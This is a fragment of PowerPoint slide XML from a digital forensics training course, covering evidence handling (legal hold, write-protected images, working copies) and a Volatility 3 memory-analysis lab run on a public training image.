            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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4064508"/>
            <a:ext cx="91440" cy="101269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005840" y="434225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05840" y="4342257"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Legal hold</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A legal hold suspends normal retention policies for evidence relevant to litigation or regulatory request.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4296537"/>
            <a:ext cx="3977639" cy="5486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52360" y="4296537"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ chmod -w /tmp/case_001/image.dd</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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77240" y="5205222"/>
            <a:ext cx="91440" cy="101269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1005840" y="5482971"/>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05840" y="5482971"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Working copies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>You analyse the working copy, never the original.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5437251"/>
            <a:ext cx="3977639" cy="5486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452360" y="5437251"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cp /tmp/case_001/image.dd /tmp/case_001/working_copy.dd</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736</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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21 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The order of volatility and why it dictates acquisition sequence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to image a disk with dd and verify with SHA-256.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Where Linux/Windows memory acquisition tools live.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to fill a chain-of-custody form and apply a legal hold.</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737</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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22 — Memory Forensics with Volatility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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will analyse a memory image with Volatility 3 — listing processes, network connections, command lines, and pulling DLLs / injected code. Memory forensics finds artefacts that never touched disk (Cobalt Strike beacons, in-memory shellcode). This maps to CySA+ 3.2 (Data and log analysis, Evidence…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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738</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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22 — Reference Diagram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g_5e96aa3087.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1466216" y="1783080"/>
            <a:ext cx="9256519" cy="4434840"/>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739</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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22 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install Volatility 3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Volatility 3 is a complete rewrite in Python 3 with built-in symbol management — no manual profile required.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y python3-pip git</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Obtain a sample memory image</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Public training images are large but free.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t># Example download (~30 MB):</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Identify the image</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Output identifies the OS, build, and addresses Volatility will use for the analysis.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ vol -f /tmp/cridex.vmem windows.info</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: List processes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Look for:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ vol -f /tmp/cridex.vmem windows.pslist</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Hunt hidden processes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A row that appears in psscan but not pslist is a rootkit-hidden process.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ vol -f /tmp/cridex.vmem windows.psscan       # scans pool, finds unlinke</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740</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3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22 — Hands-On Steps (cont'd)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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Recover command lines</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The command line of a malicious process often contains the C2 URL, base64 payload, or -NoProfile -EncodedCommand … — your fastest IOC.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ vol -f /tmp/cridex.vmem windows.cmdline</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Network connections at time of capture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Maps PID → local IP:port → remote IP:port.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ vol -f /tmp/cridex.vmem windows.netscan</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
